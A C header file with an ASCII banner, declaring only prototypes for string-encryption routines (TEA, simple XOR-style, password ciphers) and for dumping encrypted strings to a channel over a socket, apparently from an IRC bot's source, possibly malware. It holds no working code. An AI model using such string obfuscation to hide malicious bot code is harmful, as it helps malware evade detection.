/*
XXXXXXXXXXXXXX   XXXXX      XXXXX  XXXXXXXXXXXXX   XXXXXXXXXXXXX  
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXXXXX  XXXXXXXXXXXXXX 
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXXXX   XXXXXXXXXXXXX  
XXXX       XXXX  XXXXX      XXXXX  XXXXX           XXXXX            
XXXX       XXXX  XXXXX      XXXXX  XXXXX           XXXXX            
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXX     XXXXXXXXXXX     
XXXXXXXXXXXXXX   XXXXX      XXXXX  XXXXXXXXXXXX    XXXXXXXXXXXX     
XXXXXXXXX        XXXXX      XXXXX  XXXXXXXXXXX     XXXXXXXXXXX    
XXXX XXXXX       XXXXX      XXXXX  XXXXX           XXXXX           
XXXX  XXXXX      XXXXX      XXXXX  XXXXX           XXXXX           
XXXX   XXXXX     XXXXX      XXXXX  XXXXX           XXXXX           
XXXX    XXXXX    XXXXXX    XXXXXX  XXXXX           XXXXX           
XXXX     XXXXX   XXXXXXXXXXXXXXXX  XXXXX           XXXXX           
XXXX      XXXXX   XXXXXXXXXXXXXX   XXXXX           XXXXX           
XXXX       XXXXX   XXXXXXXXXXXX    XXXXX           XXXXX 
*/     


void Crypt(TCHAR *inp, DWORD inplen, TCHAR* key = "", DWORD keylen = 0);
#ifndef NO_CRYPT
void decryptstrings(int authsize, int versionsize);
#endif

#ifdef DUMP_ENCRYPT
void encryptstring(char *str, char *varname, SOCKET sock, char *chan, BOOL notice);
void encryptstrings(int authsize, int versionsize, SOCKET sock, char *chan, BOOL notice);
#endif

#ifdef SIMPLE_CRYPT
char *decrypt(char *str,int key);
char *encrypt(char *str,int key);
#endif

#ifdef TEA_CRYPT
void code(long *data, long *key);
void decode(long *data, long *key);
void codestr(char *datastr, char *keystr);
void decodestr(char *datastr, char *keystr);
#endif

#ifdef PLAIN_CRYPT
char *EncryptPassword(char *password, char *key);
char *DecryptPassword(char *password, char *key);
#endif